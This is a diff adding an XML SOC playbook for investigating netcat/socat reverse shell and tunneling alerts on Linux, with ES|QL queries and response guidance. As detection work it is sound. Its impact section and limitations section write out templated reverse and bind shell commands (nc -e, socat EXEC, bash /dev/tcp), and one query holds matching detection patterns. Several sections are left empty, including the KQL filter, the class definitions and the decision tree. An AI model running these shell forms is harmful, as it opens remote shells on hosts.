@@ -1,0 +1,430 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Playbook xmlns="https://soc.example/playbooks" id="PB-linux-netcat-socat-execution" name="Linux — Netcat/Socat Execution (Reverse Shell / Tunneling) - SOC Playbook" version="3.0" status="Validated" classification="TLP:AMBER">
+  <Metadata>
+    <Owner>NBI SOC / Detection Engineering</Owner>
+    <LastUpdated>2026-08-19</LastUpdated>
+    <Severity default="High">High</Severity>
+    <Confidence default="Medium">Medium</Confidence>
+    <Category>Command and Control</Category>
+    <MitreAttack>
+      <Technique id="T1059.004"/>
+      <Technique id="T1059"/>
+      <Technique id="T1572"/>
+      <Technique id="T1071.001"/>
+      <Technique id="T1071"/>
+      <Tactic id="TA0011"/>
+    </MitreAttack>
+    <References>
+      <Reference title="MITRE ATT&amp;CK - Command and Scripting Interpreter: Unix Shell (T1059.004)" url="https://attack.mitre.org/techniques/T1059/004/"/>
+      <Reference title="MITRE ATT&amp;CK - Protocol Tunneling (T1572)" url="https://attack.mitre.org/techniques/T1572/"/>
+      <Reference title="MITRE ATT&amp;CK - Application Layer Protocol: Web Protocols (T1071.001)" url="https://attack.mitre.org/techniques/T1071/001/"/>
+      <Reference title="MITRE ATT&amp;CK - Command and Control tactic (TA0011)" url="https://attack.mitre.org/tactics/TA0011/"/>
+      <Reference title="man7.org - ncat(1) (Nmap netcat; relays and shells)" url="https://man7.org/linux/man-pages/man1/ncat.1.html"/>
+      <Reference title="man7.org - mkfifo(1) (named pipes used for backpipes)" url="https://man7.org/linux/man-pages/man1/mkfifo.1.html"/>
+      <Reference title="GTFOBins - nc (reverse/bind shell invocations)" url="https://gtfobins.github.io/gtfobins/nc/"/>
+      <Reference title="GTFOBins - socat (reverse/bind shell invocations)" url="https://gtfobins.github.io/gtfobins/socat/"/>
+      <Reference title="Elastic - Auditd Manager integration (fields and setup)" url="https://docs.elastic.co/integrations/auditd_manager"/>
+    </References>
+  </Metadata>
+  <AlertContext>
+    <RuleName>Linux — Netcat/Socat Execution (Reverse Shell / Tunneling)</RuleName>
+    <RuleId>nbi-lnx-reverse-shell-tools</RuleId>
+    <RuleType>query</RuleType>
+    <Index>logs-auditd.log-*</Index>
+    <TriggerLogic>The deployed rule is a KQL match query over Linux auditd process telemetry, matching on the relay binary name only.
+
+One-line Kibana KQL detection filter (for fast pivoting in Discover / Timeline):
+
+
+
+Plain English: any process execution on a Linux host where the image name is nc, ncat, netcat, or socat. These binaries have an effectively zero baseline across NBI's Linux fleet (no execution observed in the trailing 30 days), so any execution warrants reading the arguments. Every runnable investigation query below is ES|QL over the _query API, keyed on the alert entity and bounded to @timestamp &gt;= NOW() - 4 hours.</TriggerLogic>
+    <KeyAlertFields>source.ip, user.name, event.action, process.name, process.executable, process.args, process.working_directory, process.pid, process.parent.pid, user.id, user.effective.id, destination.ip</KeyAlertFields>
+  </AlertContext>
+  <Inputs>
+    <Input name="$host"/>
+    <Input name="$user"/>
+    <Input name="$source_ip"/>
+    <Input name="$suspicious_pid"/>
+  </Inputs>
+  <ExecutiveSummary>
+    <Overview>This playbook drives triage and investigation of the Linux - Netcat/Socat Execution (Reverse Shell / Tunneling) detection on NBI's Elastic Security deployment. The rule fires when a Linux execve records a process.name of nc, ncat, netcat, or socat. These are general-purpose network relays that, with the right arguments, become reverse shells (connect out and hand a shell to a remote listener), bind shells (listen locally and hand a shell to whoever connects), or tunnels/port-relays for pivoting and exfiltration.
+
+The rule matches the binary name; the role - reverse, bind, relay, or a benign one-off connectivity test - is entirely in the arguments. The analyst's job is to recover the command, endpoint, and shell attachment, attribute the launch context (who and from where), look for the wider reverse-shell arsenal, and classify the alert as true_positive, false_positive (authorised OR proven-failed), misconfiguration, or needs_escalation - with evidence attached.</Overview>
+    <BusinessImpact>An alert means: on $host, one of nc/ncat/netcat/socat was executed. The role is decided by the arguments:
+
+- nc &lt;host&gt; &lt;port&gt; -e /bin/sh (or -c) connecting outbound and piping a shell is a reverse shell - live hands-on-keyboard command-and-control.
+- nc -l -p &lt;port&gt; -e /bin/sh (or -lvp) is a bind shell - a listener handing a shell to whoever connects.
+- socat TCP:&lt;host&gt;:&lt;port&gt; EXEC:/bin/bash (or the listener form) is a reverse or bind shell via socat's EXEC.
+- A plain nc &lt;internal-host&gt; &lt;port&gt; with no shell may be a benign connectivity test.
+
+The alert captures the *relay*; the investigation recovers the *endpoint and port* (for blocking and reputation), *whether a shell is attached* (-e/EXEC), *who launched it and from where* (a web/app service account from a temp/web path is a webshell hallmark; a sysadmin from a home directory is not), and *whether the broader reverse-shell arsenal appears alongside*. On a banking host, a reverse shell or tunnel is treated as an active intrusion until the endpoint and intent are disproven.</BusinessImpact>
+  </ExecutiveSummary>
+  <Investigation>
+    <Goal>Decide true_positive / false_positive / misconfiguration / needs_escalation for Linux — Netcat/Socat Execution (Reverse Shell / Tunneling).</Goal>
+    <Workflow>
+      <Step order="1" name="Reproduce the rule estate-wide (confirm the detection logic)">
+        <Purpose>Reproduce the rule estate-wide (confirm the detection logic)</Purpose>
+        <Query platform="Elastic" language="ES|QL" id="Q-01">
+          <![CDATA[
+FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
+| WHERE @timestamp >= NOW() - 4 hours
+    AND event.category == "process"
+    AND process.name IN ("nc","ncat","netcat","socat")
+| EVAL argline = MV_CONCAT(process.args, " ")
+| KEEP @timestamp, host.name, user.name, user.id, process.name, process.executable, argline
+| SORT @timestamp DESC
+| LIMIT 100
+]]>
+        </Query>
+      </Step>
+      <Step order="2" name="Confirm on the alert host - recover command, endpoint and shell attachment">
+        <Purpose>Confirm on the alert host - recover command, endpoint and shell attachment</Purpose>
+        <Query platform="Elastic" language="ES|QL" id="Q-02">
+          <![CDATA[
+FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
+| WHERE event.category=="process" AND host.name=="$host"
+    AND process.name IN ("nc","ncat","netcat","socat")
+    AND @timestamp >= NOW() - 4 hours
+| EVAL argline = MV_CONCAT(process.args, " ")
+| KEEP @timestamp, host.name, user.name, user.id, process.name, process.executable, argline, process.working_directory
+| SORT @timestamp DESC
+| LIMIT 50
+]]>
+        </Query>
+      </Step>
+      <Step order="3" name="Entity pivoting">
+        <Purpose>Entity pivoting</Purpose>
+        <Query platform="Elastic" language="ES|QL" id="Q-03">
+          <![CDATA[
+FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
+| WHERE @timestamp >= NOW() - 4 hours
+    AND event.category == "process"
+    AND host.name == "$host"
+    AND process.name IN ("nc","ncat","netcat","socat")
+| EVAL argline = MV_CONCAT(process.args, " ")
+| KEEP @timestamp, host.name, user.id, user.effective.id, process.name, process.executable, argline, process.pid, process.parent.pid, process.working_directory
+| SORT @timestamp DESC
+| LIMIT 50
+]]>
+        </Query>
+      </Step>
+      <Step order="4" name="Process investigation">
+        <Purpose>Process investigation</Purpose>
+        <Query platform="Elastic" language="ES|QL" id="Q-04">
+          <![CDATA[
+FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
+| WHERE @timestamp >= NOW() - 4 hours
+    AND event.category == "process"
+    AND process.name IN ("nc","ncat","netcat","socat")
+| STATS execs = COUNT(*), hosts = COUNT_DISTINCT(host.name), users = COUNT_DISTINCT(user.id) BY process.name, process.executable
+| SORT execs DESC
+| LIMIT 25
+]]>
+        </Query>
+      </Step>
+      <Step order="5" name="Process investigation">
+        <Purpose>Process investigation</Purpose>
+        <Query platform="Elastic" language="ES|QL" id="Q-05">
+          <![CDATA[
+FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
+| WHERE @timestamp >= NOW() - 4 hours
+    AND event.category == "process"
+    AND host.name == "$host"
+    AND process.name IN ("nc","ncat","netcat","socat")
+    AND process.args IS NOT NULL
+| EVAL arguments = MV_CONCAT(process.args, " ")
+| KEEP @timestamp, host.name, user.id, process.executable, arguments, process.working_directory
+| SORT @timestamp DESC
+| LIMIT 50
+]]>
+        </Query>
+      </Step>
+      <Step order="6" name="Parent-Child process analysis">
+        <Purpose>Parent-Child process analysis</Purpose>
+        <Query platform="Elastic" language="ES|QL" id="Q-06">
+          <![CDATA[
+FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
+| WHERE @timestamp >= NOW() - 4 hours
+    AND event.category == "process"
+    AND host.name == "$host"
+    AND user.name == "$user"
+| STATS execs = COUNT(*), distinct_children = COUNT_DISTINCT(process.name) BY process.parent.pid
+| SORT execs DESC
+| LIMIT 40
+]]>
+        </Query>
+      </Step>
+      <Step order="7" name="Parent-Child process analysis">
+        <Purpose>Parent-Child process analysis</Purpose>
+        <Query platform="Elastic" language="ES|QL" id="Q-07">
+          <![CDATA[
+FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
+| WHERE @timestamp >= NOW() - 4 hours
+    AND event.category == "process"
+    AND host.name == "$host"
+    AND process.parent.pid == $suspicious_pid
+| EVAL argline = MV_CONCAT(process.args, " ")
+| KEEP @timestamp, user.id, process.parent.pid, process.name, process.pid, process.executable, argline, process.working_directory
+| SORT @timestamp ASC
+| LIMIT 100
+]]>
+        </Query>
+      </Step>
+      <Step order="8" name="User investigation">
+        <Purpose>User investigation</Purpose>
+        <Query platform="Elastic" language="ES|QL" id="Q-08">
+          <![CDATA[
+FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
+| WHERE event.category=="process" AND host.name=="$host" AND user.name=="$user"
+    AND @timestamp >= NOW() - 4 hours
+| STATS execs=COUNT(*) BY process.name, process.working_directory, user.id
+| SORT execs DESC
+| LIMIT 25
+]]>
+        </Query>
+      </Step>
+      <Step order="9" name="User investigation">
+        <Purpose>User investigation</Purpose>
+        <Query platform="Elastic" language="ES|QL" id="Q-09">
+          <![CDATA[
+FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
+| WHERE @timestamp >= NOW() - 4 hours
+    AND event.category == "process"
+    AND user.name == "$user"
+| STATS execs = COUNT(*), distinct_procs = COUNT_DISTINCT(process.name) BY host.name
+| SORT execs DESC
+| LIMIT 20
+]]>
+        </Query>
+      </Step>
+      <Step order="10" name="Host investigation">
+        <Purpose>Host investigation</Purpose>
+        <Query platform="Elastic" language="ES|QL" id="Q-10">
+          <![CDATA[
+FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
+| WHERE @timestamp >= NOW() - 4 hours
+    AND event.category == "process"
+    AND host.name == "$host"
+| STATS execs = COUNT(*), users = COUNT_DISTINCT(user.id) BY process.name
+| SORT execs ASC
+| LIMIT 40
+]]>
+        </Query>
+      </Step>
+      <Step order="11" name="IP investigation">
+        <Purpose>IP investigation</Purpose>
+        <Query platform="Elastic" language="ES|QL" id="Q-11">
+          <![CDATA[
+FROM logs-system.auth-*
+| WHERE @timestamp >= NOW() - 4 hours
+    AND host.name == "$host"
+    AND user.name == "$user"
+    AND source.ip IS NOT NULL
+| STATS logons = COUNT(*) BY source.ip, event.action
+| SORT logons DESC
+| LIMIT 20
+]]>
+        </Query>
+      </Step>
+      <Step order="12" name="File investigation">
+        <Purpose>File investigation</Purpose>
+        <Query platform="Elastic" language="ES|QL" id="Q-12">
+          <![CDATA[
+FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
+| WHERE @timestamp >= NOW() - 4 hours
+    AND event.category == "process"
+    AND host.name == "$host"
+    AND process.name IN ("nc","ncat","netcat","socat")
+| STATS execs = COUNT(*), first_seen = MIN(@timestamp), last_seen = MAX(@timestamp) BY process.executable, process.working_directory
+| SORT execs DESC
+| LIMIT 30
+]]>
+        </Query>
+      </Step>
+      <Step order="13" name="Authentication investigation">
+        <Purpose>Authentication investigation</Purpose>
+        <Query platform="Elastic" language="ES|QL" id="Q-13">
+          <![CDATA[
+FROM logs-system.auth-*
+| WHERE @timestamp >= NOW() - 4 hours
+    AND host.name == "$host"
+    AND user.name == "$user"
+| STATS events = COUNT(*), first_seen = MIN(@timestamp), last_seen = MAX(@timestamp) BY event.action, source.ip, process.name
+| SORT events DESC
+| LIMIT 30
+]]>
+        </Query>
+      </Step>
+      <Step order="14" name="Timeline Reconstruction">
+        <Purpose>Timeline Reconstruction</Purpose>
+        <Query platform="Elastic" language="ES|QL" id="Q-14">
+          <![CDATA[
+FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
+| WHERE @timestamp >= NOW() - 4 hours
+    AND event.category == "process"
+    AND host.name == "$host"
+    AND user.name == "$user"
+| EVAL argline = MV_CONCAT(process.args, " ")
+| KEEP @timestamp, process.parent.pid, process.pid, process.name, process.executable, argline, user.id
+| SORT @timestamp ASC
+| LIMIT 200
+]]>
+        </Query>
+      </Step>
+      <Step order="15" name="Lateral movement validation">
+        <Purpose>Lateral movement validation</Purpose>
+        <Query platform="Elastic" language="ES|QL" id="Q-15">
+          <![CDATA[
+FROM logs-system.auth-*
+| WHERE @timestamp >= NOW() - 4 hours
+    AND (user.name == "$user" OR source.ip == "$source_ip")
+    AND host.name != "$host"
+    AND source.ip IS NOT NULL
+| STATS events = COUNT(*) BY host.name, source.ip, user.name, event.action
+| SORT events DESC
+| LIMIT 30
+]]>
+        </Query>
+      </Step>
+      <Step order="16" name="Persistence validation">
+        <Purpose>Persistence validation</Purpose>
+        <Query platform="Elastic" language="ES|QL" id="Q-16">
+          <![CDATA[
+FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
+| WHERE @timestamp >= NOW() - 4 hours
+    AND event.category == "process"
+    AND host.name == "$host"
+    AND process.name IN ("crontab","at","batch","systemctl","systemd-run","cron","crond","update-rc.d")
+| EVAL argline = MV_CONCAT(process.args, " ")
+| KEEP @timestamp, process.name, argline, user.id, user.effective.id
+| SORT @timestamp DESC
+| LIMIT 30
+]]>
+        </Query>
+      </Step>
+      <Step order="17" name="Privilege escalation validation">
+        <Purpose>Privilege escalation validation</Purpose>
+        <Query platform="Elastic" language="ES|QL" id="Q-17">
+          <![CDATA[
+FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
+| WHERE @timestamp >= NOW() - 4 hours
+    AND event.category == "process"
+    AND host.name == "$host"
+    AND process.name IN ("sudo","su","pkexec","doas","setuid")
+| EVAL argline = MV_CONCAT(process.args, " ")
+| KEEP @timestamp, user.name, user.id, user.effective.id, process.name, argline
+| SORT @timestamp DESC
+| LIMIT 30
+]]>
+        </Query>
+      </Step>
+      <Step order="18" name="Defense evasion validation">
+        <Purpose>Defense evasion validation</Purpose>
+        <Query platform="Elastic" language="ES|QL" id="Q-18">
+          <![CDATA[
+FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
+| WHERE @timestamp >= NOW() - 4 hours
+    AND event.category == "process"
+    AND host.name == "$host"
+    AND process.name IN ("shred","truncate","auditctl","journalctl","rm","unlink","chattr")
+| EVAL argline = MV_CONCAT(process.args, " ")
+| KEEP @timestamp, process.name, argline, user.id
+| SORT @timestamp DESC
+| LIMIT 30
+]]>
+        </Query>
+      </Step>
+      <Step order="19" name="Impact assessment">
+        <Purpose>Impact assessment</Purpose>
+        <Query platform="Elastic" language="ES|QL" id="Q-19">
+          <![CDATA[
+FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
+| WHERE event.category=="process" AND host.name=="$host"
+    AND process.name IN ("nc","ncat","netcat","socat","mkfifo","telnet","openssl","python","python3","perl","bash","sh")
+    AND @timestamp >= NOW() - 4 hours
+| EVAL argline = MV_CONCAT(process.args, " ")
+| WHERE argline LIKE "*/dev/tcp*" OR argline LIKE "*EXEC*" OR argline LIKE "* -e *" OR argline LIKE "*pty.spawn*" OR argline LIKE "*mkfifo*" OR process.name IN ("nc","ncat","netcat","socat")
+| KEEP @timestamp, process.name, argline, user.name, user.id
+| SORT @timestamp DESC
+| LIMIT 40
+]]>
+        </Query>
+      </Step>
+      <Step order="20" name="Finalize verdict">
+        <DecisionTree>
+        </DecisionTree>
+      </Step>
+    </Workflow>
+  </Investigation>
+  <ClassificationGuidance>
+    <TruePositive>
+      <Definition></Definition>
+    </TruePositive>
+    <FalsePositive>
+      <Definition></Definition>
+      <Indicators>
+        <Item>Authorised connectivity checks. An administrator or monitoring job using nc to test whether an internal port is open (no shell attachment, internal endpoint).</Item>
+        <Item>Authorised data transfers. A one-off nc/socat move of data between internal hosts by a known identity.</Item>
+        <Item>Recognised automation (a health-check script) using nc for a port probe on a stable internal endpoint.</Item>
+        <Item>Administrator / red-team / purple-team exercises deliberately exercising a reverse/bind shell. Authorised malicious-technique execution - confirm against a change ticket or exercise ROE before classifying as false_positive (blocked/authorised), never dismiss on sight.</Item>
+        <Item>True zero baseline. nc/ncat/netcat/socat executed 0 times across the fleet in the trailing 30 days and 0 in the live 4-hour window on the busiest node, against a healthy ~141k process events per 4h fleet-wide. There is no noisy legitimate relay to tune out; any execution stands alone.</Item>
+        <Item>The actor is almost always root, and user.name is frequently null. On the busiest Linux hosts (the PAM/PostgreSQL container nodes and the devops Kubernetes masters/workers), process activity runs overwhelmingly as root (user.id == 0) with a null user.name. Corroborate the actor with user.id; the webshell hallmark to watch for is a non-root web/app service account spawning the relay from a web/temp path.</Item>
+        <Item>The C2 endpoint is not a structured field. These process events do not reliably carry the remote destination - the endpoint is read from the arguments (argline), not from destination.ip. A truncated argument list can hide it; recover it from the host's auditd SOCKADDR/EXECVE records if needed.</Item>
+        <Item>No historical NBI benign-true-positive is on record for this rule. No environment-specific allow-list applies. Do not create a blanket exception off a single alert; scope any exception to an exact account + endpoint + purpose + change reference.</Item>
+      </Indicators>
+    </FalsePositive>
+    <Misconfiguration>
+      <Definition></Definition>
+    </Misconfiguration>
+    <NeedsEscalation>
+      <Definition></Definition>
+    </NeedsEscalation>
+  </ClassificationGuidance>
+  <ResponseActions>
+    <Phase name="Containment">
+      <Action>Kill the session and its parent. Terminate the relay ($suspicious_pid) and its parent interpreter/webshell process tree (section 15.3) to drop the C2 channel.</Action>
+      <Action>Block the C2 endpoint at egress. Read the destination address and port from argline (section 14.2) and block it at the FortiGate/egress; add it to watchlists.</Action>
+      <Action>Isolate $host (network-contain / quarantine) if a true_positive is confirmed. On a shared container node, coordinate with the platform team to protect co-located workloads while prioritising containment.</Action>
+      <Action>Preserve the process tree and, via the platform team, the host's auditd SOCKADDR/EXECVE records for the endpoint, before further change.</Action>
+      <Action>Deploy/confirm changes only via the authorised human-approved DEPLOY path; investigation itself is read-only.</Action>
+    </Phase>
+    <Phase name="Eradication">
+      <Action>Remove the webshell / initial-access artifact that launched the relay (identify it via the parent lineage section 15.3 and the working directory section 15.10) and any dropped tooling.</Action>
+      <Action>Remove any persistence installed from the shell (section 17.2) so the C2 cannot relaunch.</Action>
+      <Action>Keep the endpoint blocked and hunt for the same endpoint and relay pattern across peers, especially any host $user/$source_ip touched (section 15.4b, section 17.1).</Action>
+      <Action>Remediate the initial-access vector (exploited service, webshell upload path) that gave the attacker execution.</Action>
+    </Phase>
+    <Phase name="Recovery">
+      <Action>Rotate credentials and keys exposed on $host during the C2 window - the service/app account, service credentials, and any SSH keys; if this is a PAM/DB node, treat vaulted/DB secrets as potentially exposed and rotate on priority.</Action>
+      <Action>Restore $host from a known-good image if the attacker had extensive hands-on access; otherwise validate that webshell/persistence removal holds after reboot.</Action>
+      <Action>Return the host/account to service only after section 22 closing criteria are met and monitoring confirms no new relay or call-back recurs.</Action>
+      <Action>Harden (section 23): tighten egress filtering and default-deny outbound from server segments, remove or restrict nc/socat on production hosts, and monitor service accounts spawning interpreters or relays from web/temp paths.</Action>
+    </Phase>
+  </ResponseActions>
+  <Escalation>
+    <Trigger>Escalate to Tier 3 / Incident Response (and notify the customer) when any of the following hold:
+
+- A shell is attached (-e/EXEC) to an external endpoint, or a bind listener is confirmed (section 14.2).
+- The reverse-shell arsenal co-occurs (/dev/tcp, pty.spawn, mkfifo, EXEC - section 17.5), confirming an interactive session.
+- The launcher is a service/web account from a temp/web path (section 15.4a) - a webshell-driven C2.
+- Lateral movement / pivoting follows (section 17.1), or persistence was installed from the shell (section 17.2).
+- Endpoint/arguments cannot be recovered and intent cannot be established - escalate as needs_escalation (on-host SOCKADDR/EXECVE) with the gaps named.</Trigger>
+    <To>SOC L2 / IR</To>
+  </Escalation>
+  <ClosureCriteria>
+    <Item>false_positive (authorised): a change record positively matches an authorised connectivity check/transfer (known identity, internal endpoint, no -e/EXEC). Record the reference. Do not create a broad exception; if warranted, scope it to the exact account + endpoint.</Item>
+    <Item>false_positive (proven-failed C2 attempt): a reverse/bind attempt positively proven to have failed to connect / been blocked at egress - documented as a blocked attempt, never "benign".</Item>
+    <Item>misconfiguration: a legitimate script/monitoring job used nc/socat with no shell attachment and no external endpoint, simply not yet baselined; document and baseline it (prefer a purpose-built check).</Item>
+    <Item>true_positive: reverse/bind shell or tunnel confirmed; session killed, endpoint blocked, $host contained, webshell/persistence removed, exposed credentials rotated, scope of $user/$source_ip/peers established, initial access hunted, no recurrence on monitoring.</Item>
+    <Item>needs_escalation: handed to Tier 3/IR with the specific evidence gaps documented.</Item>
+  </ClosureCriteria>
+  <Limitations>
+    <Item>Zero baseline = high fidelity. nc/ncat/netcat/socat do not appear in NBI's Linux process telemetry over 30 days or in the live 4-hour window. When this rule fires, read the arguments and treat it as active until disproven.</Item>
+    <Item>The endpoint hides in the arguments. There is no destination.ip on these events - the C2 endpoint is in argline (MV_CONCAT(process.args," ")). A truncated argument list can hide it; recover it on-host from auditd SOCKADDR/EXECVE.</Item>
+    <Item>The launch context is the discriminator. A non-root service/web account launching a relay from a web/temp path is the webshell hallmark and flips the verdict; a sysadmin from an admin path running a one-off test is benign-leaning. user.name is often null - use user.id and the parent lineage.</Item>
+    <Item>No SSH login behind the relay is itself a signal. A relay launched by a service account with no matching interactive login (section 15.12) points to a webshell/exploited-service launch rather than a hands-on admin.</Item>
+    <Item>No parent path → PID lineage. With process.parent.executable/.name unpopulated, reconstruct trees with process.parent.pid/process.pid (section 15.3), corroborating with timing.</Item>
+    <Item>The rule is name-based and evadable. C2 does not require these binaries - a bash -i &gt;&amp; /dev/tcp/&lt;c2&gt;/&lt;port&gt; shell, a Python/Perl/PHP one-liner, ssh -R, or an HTTPS beacon all provide reverse access without nc/socat. Complementary signal: hunt interpreters spawning with /dev/tcp or pty patterns (the section 17.5 arsenal), service accounts spawning shells, and outbound connections from server hosts to new external endpoints; correlate with egress/proxy and FortiGate flow data for the destination.</Item>
+    <Item>KB-worthy (persist to NBI customer scope): (1) nc/ncat/netcat/socat zero-baseline over 4h fleet-wide and 30d; (2) actor on the busy nodes = root, user.name largely null (the webshell hallmark is a non-root service account); (3) no destination.ip on the auditd stream - endpoint is in process.args; (4) logs-system.auth-* carries SSH source.ip for session origin; (5) the section 17.5 arsenal LIKE-cluster confirms an interactive reverse shell. All observed live on 2026-08-17.</Item>
+  </Limitations>
+</Playbook>
